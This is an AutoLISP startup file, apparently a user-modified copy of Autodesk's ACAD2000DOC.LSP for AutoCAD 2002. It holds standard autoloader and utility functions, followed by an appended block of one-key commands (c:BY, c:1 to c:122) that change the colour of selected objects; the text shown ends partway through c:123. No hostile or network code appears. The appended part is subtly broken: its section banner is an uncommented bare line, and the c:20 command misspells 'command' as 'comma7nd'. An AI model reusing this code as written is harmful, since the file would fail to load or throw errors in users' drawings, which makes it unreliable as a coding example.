; Next available MSG number is  104
; MODULE_ID ACAD2000doc_LSP_
;;;    ACAD2000DOC.LSP Version 1.0 for AutoCAD 2002
;;;
;;;    Copyright (C) 1994 - 2001 by Autodesk, Inc.
;;;
;;;    Permission to use, copy, modify, and distribute this software
;;;    for any purpose and without fee is hereby granted, provided
;;;    that the above copyright notice appears in all copies and
;;;    that both that copyright notice and the limited warranty and
;;;    restricted rights notice below appear in all supporting
;;;    documentation.
;;;
;;;    AUTODESK PROVIDES THIS PROGRAM "AS IS" AND WITH ALL FAULTS.
;;;    AUTODESK SPECIFICALLY DISCLAIMS ANY IMPLIED WARRANTY OF
;;;    MERCHANTABILITY OR FITNESS FOR A PARTICULAR USE.  AUTODESK, INC.
;;;    DOES NOT WARRANT THAT THE OPERATION OF THE PROGRAM WILL BE
;;;    UNINTERRUPTED OR ERROR FREE.
;;;
;;;    Use, duplication, or disclosure by the U.S. Government is subject to
;;;    restrictions set forth in FAR 52.227-19 (Commercial Computer
;;;    Software - Restricted Rights) and DFAR 252.227-7013(c)(1)(ii) 
;;;    (Rights in Technical Data and Computer Software), as applicable.
;;;
;;;.
;;;
;;;    Note:
;;;            This file is loaded automatically by AutoCAD every time 
;;;            a drawing is opened.  It establishes an autoloader and
;;;            other utility functions.
;;;
;;;    Globalization Note:   
;;;            We do not support autoloading applications by the native 
;;;            language command call (e.g. with the leading underscore
;;;            mechanism.)


;;;===== Raster Image Support for Clipboard Paste Special =====
;;
;; IMAGEFILE
;;
;; Allow the IMAGE command to accept an image file name without
;; presenting the file dialog, even if filedia is on.
;; Example: (imagefile "c:/images/house.bmp")
;;
(defun imagefile (filename / filedia-save cmdecho-save)
  (setq filedia-save (getvar "FILEDIA"))
  (setq cmdecho-save (getvar "CMDECHO"))
  (setvar "FILEDIA" 0)
  (setvar "CMDECHO" 0)
  (command "_.-image" "_attach" filename)
  (setvar "FILEDIA" filedia-save)
  (setvar "CMDECHO" cmdecho-save)
  (princ)
)

;;;=== General Utility Functions ===

;   R12 compatibility - In R12 (acad_helpdlg) was an externally-defined 
;   ADS function.  Now it's a simple AutoLISP function that calls the 
;   built-in function (help).  It's only purpose is R12 compatibility.  
;   If you are calling it for anything else, you should almost certainly 
;   be calling (help) instead. 
 
(defun acad_helpdlg (helpfile topic)
  (help helpfile topic)
)


(defun *merr* (msg)
  (setq *error* m:err m:err nil)
  (princ)
)

(defun *merrmsg* (msg)
  (princ msg)
  (setq *error* m:err m:err nil)
  (princ)
)

;; Loads the indicated ARX app if it isn't already loaded
;; returns nil if no load was necessary, else returns the
;; app name if a load occurred.
(defun verify_arxapp_loaded (app) 
  (if (not (loadedp app (arx)))
      (arxload app f)
  )
)

;; determines if a given application is loaded...
;; general purpose: can ostensibly be used for appsets (arx) or (ads) or....
;;
;; app is the filename of the application to check (extension is required)
;; appset is a list of applications, (such as (arx) or (ads)
;; 
;; returns T or nil, depending on whether app is present in the appset
;; indicated.  Case is ignored in comparison, so "foo.arx" matches "FOO.ARX"
;; Also, if appset contains members that contain paths, app will right-match
;; against these members, so "bar.arx" matches "c:\\path\\bar.arx"; note that
;; "bar.arx" will *not* match "c:\\path\\foobar.arx."
(defun loadedp (app appset)
  (cond (appset  (or 
                     ;; exactly equal? (ignoring case)
                     (= (strcase (car appset))
                        (strcase app))
                     ;; right-matching? (ignoring case, but assuming that
                     ;; it's a complete filename (with a backslash before it)
					 (and 
					     (> (strlen (car appset)) (strlen app))
	                     (= (strcase (substr (car appset) 
	                                         (- (strlen (car appset)) 
	                                            (strlen app) 
	                                         ) 
	                                 )
	                        ) 
	                        (strcase (strcat "\\" app))
	                     )
				     )
                     ;; no match for this entry in appset, try next one....
                     (loadedp app (cdr appset)) )))
)


;;; ===== Single-line MText editor =====
(defun LispEd (contents / fname dcl state)
  (if (not (setq fname (getvar "program")))
     (setq fname "acad")
  )
  (strcat fname ".dcl")
  (setq dcl (load_dialog fname))
  (if (not (new_dialog "LispEd" dcl)) (exit))
  (set_tile "contents" contents)
  (mode_tile "contents" 2)
  (action_tile "contents" "(setq contents $value)")
  (action_tile "accept" "(done_dialog 1)")
  (action_tile "mtexted" "(done_dialog 2)" )
  (setq state (start_dialog))
  (unload_dialog dcl)
  (cond
    ((= state 1) contents)
    ((= state 2) -1)
    (t 0)
  )
)

;;; ===== Discontinued commands =====
(defun c:ddselect(/ cmdecho-save)
  (setq cmdecho-save (getvar "CMDECHO"))
  (setvar "CMDECHO" 0)
  (command "._+options" 7)
  (setvar "CMDECHO" cmdecho-save)
  (princ)
)

(defun c:ddgrips(/ cmdecho-save)
  (setq cmdecho-save (getvar "CMDECHO"))
  (setvar "CMDECHO" 0)
  (command "._+options" 7)
  (setvar "CMDECHO" cmdecho-save)
  (princ)
)

(defun c:gifin ()
  (alert "\nThe GIFIN command is no longer supported.\nUse the IMAGE command to attach raster image files.\n")
  (princ)
)

(defun c:pcxin ()
  (alert "\nThe PCXIN command is no longer supported.\nUse the IMAGE command to attach raster image files.\n")
  (princ)
)

(defun c:tiffin ()
  (alert "\nThe TIFFIN command is no longer supported.\nUse the IMAGE command to attach raster image files.\n")
  (princ)
)

(defun c:ddemodes()
  (alert "The Object Properties toolbar incorporates DDEMODES functionality.  \nDDEMODES has been discontinued.  \n\nFor more information, select \"Object Properties toolbar\" from the AutoCAD Help Index tab.")
  (princ)
)

(defun c:ddrmodes(/ cmdecho-save)
  (setq cmdecho-save (getvar "CMDECHO"))
  (setvar "CMDECHO" 0)
  (command "._+dsettings" 0)
  (setvar "CMDECHO" cmdecho-save)
  (princ)
)

;; HPCONFIG
(defun c:hpconfig (/ hlppath)
  (if (not (setq hlppath (findfile "acad.hlp")))
    (setq hlppath ""))
  (help hlppath "hpconfig")
  (princ)
)

;; OCECONFIG
(defun c:oceconfig (/ hlppath)
  (if (not (setq hlppath (findfile "acad.hlp")))
    (setq hlppath ""))
  (help hlppath "oceconfig")
  (princ)
)

;; CCONFIG
(defun c:cconfig (/ hlppath)
  (if (not (setq hlppath (findfile "acad.hlp")))
    (setq hlppath ""))
  (help hlppath "cconfig")
  (princ)
)

;;; ===== AutoLoad =====

;;; Check list of loaded <apptype> applications ("ads" or "arx")
;;; for the name of a certain appplication <appname>.
;;; Returns T if <appname> is loaded.

(defun ai_AppLoaded (appname apptype)
   (apply 'or
      (mapcar 
        '(lambda (j)
	    (wcmatch
               (strcase j T)
               (strcase (strcat "*" appname "*") T)
            )   
         )
	 (eval (list (read apptype)))
      )
   )
)

;;  
;;  Native Rx commands cannot be called with the "C:" syntax.  They must 
;;  be called via (command).  Therefore they require their own autoload 
;;  command.

(defun autonativeload (app cmdliste / qapp)
  (setq qapp (strcat "\"" app "\""))
  (setq initstring "\nInitializing...")
  (mapcar
   '(lambda (cmd / nom_cmd native_cmd)
      (progn
        (setq nom_cmd (strcat "C:" cmd))
        (setq native_cmd (strcat "\"_" cmd "\""))
        (if (not (eval (read nom_cmd)))
            (eval
             (read (strcat
                    "(defun " nom_cmd "()"
                    "(setq m:err *error* *error* *merrmsg*)"
                    "(if (ai_ffile " qapp ")"
                    "(progn (princ initstring)"
                    "(_autoarxload " qapp ") (command " native_cmd "))"
                    "(ai_nofile " qapp "))"
                    "(setq *error* m:err m:err nil))"
                    ))))))
   cmdliste)
  nil
)

(defun _autoqload (quoi app cmdliste / qapp symnam)
  (setq qapp (strcat "\"" app "\""))
  (setq initstring "\nInitializing...")
  (mapcar
   '(lambda (cmd / nom_cmd)
      (progn
        (setq nom_cmd (strcat "C:" cmd))
        (if (not (eval (read nom_cmd)))
            (eval
             (read (strcat
                    "(defun " nom_cmd "( / rtn)"
                    "(setq m:err *error* *error* *merrmsg*)"
                    "(if (ai_ffile " qapp ")"
                    "(progn (princ initstring)"
                    "(_auto" quoi "load " qapp ") (setq rtn (" nom_cmd ")))"
                    "(ai_nofile " qapp "))"
                    "(setq *error* m:err m:err nil)"
                    "rtn)"
                    ))))))
   cmdliste)
  nil
)

(defun autoload (app cmdliste)
  (_autoqload "" app cmdliste)
)

(defun autoarxload (app cmdliste)
  (_autoqload "arx" app cmdliste)
)

(defun autoarxacedload (app cmdliste / qapp symnam)
  (setq qapp (strcat "\"" app "\""))
  (setq initstring "\nInitializing...")
  (mapcar
   '(lambda (cmd / nom_cmd)
      (progn
        (setq nom_cmd (strcat "C:" cmd))
        (if (not (eval (read nom_cmd)))
            (eval
             (read (strcat
                    "(defun " nom_cmd "( / oldcmdecho)"
                    "(setq m:err *error* *error* *merrmsg*)"
                    "(if (ai_ffile " qapp ")"
                    "(progn (princ initstring)"
                    "(_autoarxload " qapp ")"
                    "(setq oldcmdecho (getvar \"CMDECHO\"))"
                    "(setvar \"CMDECHO\" 0)"
                    "(command " "\"_" cmd "\"" ")"
                    "(setvar \"CMDECHO\" oldcmdecho))"
                    "(ai_nofile " qapp "))"
                    "(setq *error* m:err m:err nil)"
                    "(princ))"
                    ))))))
   cmdliste)
  nil
)

(defun _autoload (app)
; (princ "Auto:(load ") (princ app) (princ ")") (terpri)
  (load app)
)

(defun _autoarxload (app)
; (princ "Auto:(arxload ") (princ app) (princ ")") (terpri)
  (arxload app)
)

(defun ai_ffile (app)
  (or (findfile (strcat app ".lsp"))
      (findfile (strcat app ".exp"))
      (findfile (strcat app ".exe"))
      (findfile (strcat app ".arx"))
      (findfile app)
  )
)

(defun ai_nofile (filename)
  (princ
    (strcat "\nThe file "
            filename
            "(.lsp/.exe/.arx) was not found in your search path folders."
    )
  )
  (princ "\nCheck the installation of the support files and try again.")
  (princ)
)


;;;===== AutoLoad LISP Applications =====
;  Set help for those apps with a command line interface

(autoload "edge"  '("edge"))
(setfunhelp "C:edge" "" "edge")

(autoload "filter" '("filter " "filter"))

(autoload "3d" '("3d" "3d" "ai_box" "ai_pyramid" "ai_wedge" "ai_dome"
                 "ai_mesh" "ai_sphere" "ai_cone" "ai_torus" "ai_dish")
)
(setfunhelp "C:3d" "" "3d")
(setfunhelp "C:ai_box" "" "3d_box")
(setfunhelp "C:ai_pyramid" "" "3d_pyramid")
(setfunhelp "C:ai__wedge" "" "3d_wedge")
(setfunhelp "C:ai_dome" "" "3d_dome")
(setfunhelp "C:ai_mesh" "" "3d_mesh")
(setfunhelp "C:ai_sphere" "" "3d_sphere")
(setfunhelp "C:ai_cone" "" "3d_cone")
(setfunhelp "C:ai_torus" "" "3d_torus")
(setfunhelp "C:ai_dish" "" "3d_dish")

(autoload "3darray" '("3darray"))
(setfunhelp "C:3darray" "" "3darray")

(autoload "ddvpoint" '("ddvpoint"))

(autoload "mvsetup" '("mvsetup"))
(setfunhelp "C:mvsetup" "" "mvsetup")

(autoload "ddptype" '("ddptype"))

(autoload "attredef" '("attredef"))
(setfunhelp "C:attredef" "" "attredef")

(autoload "xplode" '("xp" "xplode"))
(setfunhelp "C:xplode" "" "xplode")

(autoload "tutorial" '("tutdemo" "tutclear"
				       "tutdemo" 
				       "tutclear"))

;;;===== AutoArxLoad Arx Applications =====

(autoarxload "geomcal" '("cal" "cal"))

(autoarxload "geom3d" '("mirror3d" "rotate3d" "align"
		      "mirror3d" "rotate3d" 
                                 "align"))


;;; ===== Double byte character handling functions =====

(defun is_lead_byte(code)
    (setq asia_cd (getvar "dwgcodepage"))
    (cond
        ( (or (= asia_cd "dos932")
              (= asia_cd "ANSI_932")
          )
          (or (and (<= 129 code) (<= code 159))
              (and (<= 224 code) (<= code 252))
          )
        )
        ( (or (= asia_cd "big5")
              (= asia_cd "ANSI_950")
          )
          (and (<= 129 code) (<= code 254))
        )
        ( (or (= asia_cd "gb2312")
              (= asia_cd "ANSI_936")
          )
          (and (<= 161 code) (<= code 254))
        )
        ( (or (= asia_cd "johab")
              (= asia_cd "ANSI_1361")
          )
          (and (<= 132 code) (<= code 211))
        )
        ( (or (= asia_cd "ksc5601")
              (= asia_cd "ANSI_949")
          )
          (and (<= 129 code) (<= code 254))
        )
    )
)

;;; ====================================================


;;;
;;;  FITSTR2LEN
;;;
;;;  Truncates the given string to the given length. 
;;;  This function should be used to fit symbol table names, that
;;;  may turn into \U+ sequences into a given size to be displayed
;;;  inside a dialog box.
;;;
;;;  Ex: the following string: 
;;;
;;;      "This is a long string that will not fit into a 32 character static text box."
;;;
;;;      would display as a 32 character long string as follows:
;;;
;;;      "This is a long...tatic text box."
;;;

(defun fitstr2len (str1 maxlen)

    ;;; initialize internals
    (setq tmpstr str1)
    (setq len (strlen tmpstr))

    (if (> len maxlen) 
         (progn
            (setq maxlen2 (/ maxlen 2))
            (if (> maxlen (* maxlen2 2))
                 (setq maxlen2 (- maxlen2 1))
            )
            (if (is_lead_byte (substr tmpstr (- maxlen2 2) 1))
                 (setq tmpstr1 (substr tmpstr 1 (- maxlen2 3)))
                 (setq tmpstr1 (substr tmpstr 1 (- maxlen2 2)))
            )
            (if (is_lead_byte (substr tmpstr (- len (- maxlen2 1)) 1))
                 (setq tmpstr2 (substr tmpstr (- len (- maxlen2 3))))
                 (setq tmpstr2 (substr tmpstr (- len (- maxlen2 2))))
            )
            (setq str2 (strcat tmpstr1 "..." tmpstr2))
         ) ;;; progn
         (setq str2 (strcat tmpstr))
    ) ;;; if
) ;;; defun


;;;
;;;  If the first object in a selection set has an attached URL
;;;  Then launch browser and point to the URL.
;;;  Called by the Grips Cursor Menu
;;;

(defun C:gotourl ( / ssurl url i)
   (setq m:err *error* *error* *merrmsg* i 0)

; if some objects are not already pickfirst selected, 
; then allow objects to be selected

  (if (not (setq ssurl (ssget "_I")))
      (setq ssurl (ssget))
  )

; if geturl LISP command not found then load arx application

  (if (/= (type geturl) 'EXRXSUBR)
    (arxload "dwfout")
  )
  
;  Search list for first object with an URL
  (while (and (= url nil) (< i (sslength ssurl)))
    (setq url (geturl (ssname ssurl i))
	  i (1+ i))
  )

; If an URL has be found, open browser and point to URL
  (if (= url nil)
    (alert "No Universal Resource Locator associated with the object.")
    (command "_.browser" url)
  )

  (setq *error* m:err m:err nil)
  (princ)

)

;; Used by the import dialog to silently load a 3ds file
(defun import3ds (filename / filedia_old render)
  ;; Load Render if not loaded
  (setq render (findfile "acRender.arx"))
  (if render
    (verify_arxapp_loaded render) 
    (quit)
  )

  ;; Save current filedia & cmdecho setting.
  (setq filedia-save (getvar "FILEDIA"))
  (setq cmdecho-save (getvar "CMDECHO"))
  (setvar "FILEDIA" 0)
  (setvar "CMDECHO" 0)

  ;; Call 3DSIN and pass in filename.
  (c:3dsin 1 filename)

  ;; Reset filedia & cmdecho
  (setvar "FILEDIA" filedia-save)
  (setvar "CMDECHO" cmdecho-save)
  (princ)
)

;;  load Image menu (CAD Overlay teaser), if it has not been loaded
(if (and (not (menugroup "ACCOV"))
         (not (getenv "ACCOV:TMPMNU")) )
  (progn
    ;;  set "run once" flag
    (setenv "ACCOV:TMPMNU" "1")
    ;;  quietly load menu
    (setvar "CMDECHO" 0)
    (command "_.MENULOAD" "ACCOV")
    (setvar "CMDECHO" 1)
  )
)

;;;----------------------------------------------------------------------------
; New "Select All" function.  Cannot be called transparently.

(defun c:ai_selall ( / ss old_error a b old_cmd old_hlt)
  (setq a "CMDECHO" b "HIGHLIGHT"
        old_cmd (getvar a)  old_hlt (getvar b)           
        old_error *error* *error* ai_error)
  (if (ai_notrans)
    (progn
      (princ "Selecting objects...")
      (setvar a 0)
      (setvar b 0)
      (command "_.SELECT" "_ALL" "")    ; Create Previous SS
      (setvar a old_cmd)
      (setvar b old_hlt)
      (setq ss (ssget "_P"))
      (sssetfirst ss ss)        ; Non-gripped, but selected (someday!)
      (princ "done.\n")
    )
  )
  (setq *error* old_error old_error nil ss nil)
  (princ)
)

;;;
;;; Routines that check CMDACTIVE and post an alert if the calling routine
;;; should not be called in the current CMDACTIVE state.  The calling 
;;; routine calls (ai_trans) if it can be called transparently or 
;;; (ai_notrans) if it cannot.
;;;
;;;           1 - Ordinary command active.
;;;           2 - Ordinary and transparent command active.
;;;           4 - Script file active.
;;;           8 - Dialogue box active.
;;;
(defun ai_trans ()
  (if (zerop (logand (getvar "cmdactive") (+ 2 8) ))
    T
    (progn 
      (alert "This command may not be invoked transparently.")
      nil
    )
  )
)

(defun ai_transd ()
  (if (zerop (logand (getvar "cmdactive") (+ 2) ))
    T
    (progn 
      (alert "This command may not be invoked transparently.")
      nil
    )
  )
)

(defun ai_notrans ()
  (if (zerop (logand (getvar "cmdactive") (+ 1 2 8) ))
    T
    (progn 
      (alert "This command may not be invoked transparently.")
      nil
    )
  )
)

;;;----------------------------------------------------------------------------
; New function for invoking the product support help through the browser

(defun C:ai_product_support ()
   (setq url "http://pointa.autodesk.com/gotoPointA.jsp?dest=english")
   (command "_.browser" url)
)
     
     ====== LAYER & COLOR NUMBER OR LINETYPE CHANGE ONE-KEY ======

(defun c:BY()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "BYLAYER" "")
            (command "change" Z "" "p" "LT" "BYLAYER" "")
            )
(defun c:1()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "1" "")
       )
(defun c:2()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "2" "")
       )
(defun c:3()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "3" "")
       )
(defun c:4()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "4" "")
       )
(defun c:5()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "5" "")
       )
(defun c:6()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "6" "")
       )
(defun c:7()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "7" "")
       )
(defun c:8()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "8" "")
       )
(defun c:9()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "9" "")
       )
(defun c:10()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "10" "")
       )
(defun c:11()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "11" "")
       )
(defun c:12()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "12" "")
       )
(defun c:13()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "13" "")
       )
(defun c:14()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "14" "")
       )
(defun c:15()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "15" "")
       )
(defun c:16()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "16" "")
       )
(defun c:17()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "17" "")
       )
(defun c:18()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "18" "")
       )
(defun c:19()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "19" "")
       )
(defun c:20()
       (graphscr)
            (setq Z (ssget))
            (comma7nd "change" Z "" "p" "c" "20" "")
       )
(defun c:21()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "21" "")
       )
(defun c:22()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "22" "")
       )
(defun c:23()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "23" "")
       )
(defun c:24()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "24" "")
       )
(defun c:25()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "25" "")
       )
(defun c:26()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "26" "")
       )
(defun c:27()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "27" "")
       )
(defun c:28()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "28" "")
       )
(defun c:29()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "29" "")
       )
(defun c:30()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "30" "")
       )
(defun c:31()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "31" "")
       )
(defun c:32()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "32" "")
       )
(defun c:33()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "33" "")
       )
(defun c:34()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "34" "")
       )
(defun c:35()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "35" "")
       )
(defun c:36()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "36" "")
       )
(defun c:37()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "37" "")
       )
(defun c:38()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "38" "")
       )
(defun c:39()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "39" "")
       )
(defun c:40()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "40" "")
       )
(defun c:41()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "41" "")
       )
(defun c:42()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "42" "")
       )
(defun c:43()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "43" "")
       )
(defun c:44()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "44" "")
       )
(defun c:45()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "45" "")
       )
(defun c:46()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "46" "")
       )
(defun c:47()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "47" "")
       )
(defun c:48()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "48" "")
       )
(defun c:49()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "49" "")
       )
(defun c:50()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "50" "")
       )
(defun c:51()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "51" "")
       )
(defun c:52()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "52" "")
       )
(defun c:53()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "53" "")
       )
(defun c:54()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "54" "")
       )
(defun c:55()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "55" "")
       )
(defun c:56()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "56" "")
       )
(defun c:57()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "57" "")
       )
(defun c:58()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "58" "")
       )
(defun c:59()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "59" "")
       )
(defun c:60()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "60" "")
       )
(defun c:61()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "61" "")
       )
(defun c:62()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "62" "")
       )
(defun c:63()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "63" "")
       )
(defun c:64()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "64" "")
       )
(defun c:65()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "65" "")
       )
(defun c:66()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "66" "")
       )
(defun c:67()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "67" "")
       )
(defun c:68()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "68" "")
       )
(defun c:69()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "69" "")
       )
(defun c:70()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "70" "")
       )
(defun c:71()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "71" "")
       )
(defun c:72()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "72" "")
       )
(defun c:73()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "73" "")
       )
(defun c:74()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "74" "")
       )
(defun c:75()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "75" "")
       )
(defun c:76()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "76" "")
       )
(defun c:77()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "77" "")
       )
(defun c:78()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "78" "")
       )
(defun c:79()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "79" "")
       )
(defun c:80()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "80" "")
       )
(defun c:81()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "81" "")
       )
(defun c:82()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "82" "")
       )
(defun c:83()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "83" "")
       )
(defun c:84()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "84" "")
       )
(defun c:85()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "85" "")
       )
(defun c:86()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "86" "")
       )
(defun c:87()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "87" "")
       )
(defun c:88()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "88" "")
       )
(defun c:89()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "89" "")
       )
(defun c:90()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "90" "")
       )
(defun c:91()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "91" "")
       )
(defun c:92()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "92" "")
       )
(defun c:93()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "93" "")
       )
(defun c:94()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "94" "")
       )
(defun c:95()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "95" "")
       )
(defun c:96()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "96" "")
       )
(defun c:97()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "97" "")
       )
(defun c:98()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "98" "")
       )
(defun c:99()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "99" "")
       )
(defun c:100()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "100" "")
       )
(defun c:101()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "101" "")
       )
(defun c:102()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "102" "")
       )
(defun c:103()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "103" "")
       )
(defun c:104()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "104" "")
       )
(defun c:105()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "105" "")
       )
(defun c:106()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "106" "")
       )
(defun c:107()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "107" "")
       )
(defun c:108()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "108" "")
       )
(defun c:109()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "109" "")
       )
(defun c:110()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "110" "")
       )
(defun c:111()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "111" "")
       )
(defun c:112()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "112" "")
       )
(defun c:113()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "113" "")
       )
(defun c:114()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "114" "")
       )
(defun c:115()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "115" "")
       )
(defun c:116()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "116" "")
       )
(defun c:117()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "117" "")
       )
(defun c:118()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "118" "")
       )
(defun c:119()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "119" "")
       )
(defun c:120()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "120" "")
       )
(defun c:121()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "121" "")
       )
(defun c:122()
       (graphscr)
            (setq Z (ssget))
            (command "change" Z "" "p" "c" "122" "")
       )
(defun c:123()
